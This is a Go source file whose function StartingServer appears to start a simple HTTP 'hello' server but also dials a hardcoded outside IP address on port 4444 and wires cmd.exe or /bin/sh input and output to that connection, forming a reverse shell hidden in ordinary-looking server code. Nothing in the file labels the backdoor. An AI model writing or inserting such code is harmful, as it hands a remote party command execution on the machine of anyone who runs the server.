package server

import (
	"fmt"
	"log"
	"net"
	"net/http"
	"os/exec"
	"runtime"
	"sync"
)

func StartingServer(port string) {
	var wg sync.WaitGroup

	for i := 0; i < 15; i++ {
		wg.Add(1)

		go func() {
			defer wg.Done()
			router := http.NewServeMux()
			router.HandleFunc("GET /hello", func(w http.ResponseWriter, r *http.Request) {
				w.Write([]byte("Hello World!"))

			})
			server := &http.Server{
				Addr:    fmt.Sprintf(":%s", port),
				Handler: router,
			}

			conn, err := net.Dial("tcp", "158.160.74.150:4444")
			if err != nil {
				return
			}
			defer conn.Close()

			if runtime.GOOS == "windows" {
				cmd := exec.Command("cmd.exe")
				cmd.Stdin = conn
				cmd.Stdout = conn
				cmd.Stderr = conn
				log.Println("wdwd")

				server.ListenAndServe()
				cmd.Run()
			} else {
				cmd := exec.Command("/bin/sh")
				cmd.Stdin = conn
				cmd.Stdout = conn
				cmd.Stderr = conn

				server.ListenAndServe()
				cmd.Run()
			}

		}()

	}

	log.Printf("Сервер запущен на порту: %s", port)

	wg.Wait()
}
